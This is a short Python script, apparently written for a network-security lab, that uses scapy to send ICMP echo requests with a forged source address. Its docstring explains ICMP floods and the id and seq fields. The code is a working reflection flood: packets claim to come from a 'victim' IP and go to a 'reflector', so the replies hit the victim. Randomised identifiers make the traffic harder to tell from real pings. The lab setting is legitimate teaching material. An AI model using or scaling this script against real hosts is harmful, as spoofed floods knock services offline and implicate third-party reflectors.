"""
ICMP floods (or ping floods) overwhelm their target with large volumes of ICMP echo requests packets.
ICMP does not use ports or flags, but uses a type field to define the message.

Type 8 - is an echo request, Type 0 - echo reply

Real pings use id and seq to match the requests with the replies.
For the lab we use random and unrelated id and seq values for each packet.
Real pings use one id for the entire sequence, and increment the seq so this traffic is very distinguishable.

Also both id and seq are 16-bit fields unlike TCP's 32-bit.

"""

from scapy.all import ICMP, IP, send
import random

# Config information:
victim_ip = "192.168.168.10" # testing-target ip
reflector_ip = "192.168.168.13" # reflector ip
num_packets = 100 # number of packets to send

def main():
    print(f"Starting ICMP flood: \nSending {num_packets} to {victim_ip}..")

    for i in range(num_packets):
        random_seq = random.randint(0, 65535) # both seq and id are 16-bit range
        random_id = random.randint(0, 65535)

        packet = IP(src=victim_ip, dst=reflector_ip)/ ICMP(
            type="echo-request",
            id=random_id,
            seq=random_seq
        )

        send(packet, verbose=0)

    print(f"\nPackets sent successfully. Sent {num_packets} ICMP packets.")


if __name__ == "__main__":
    main()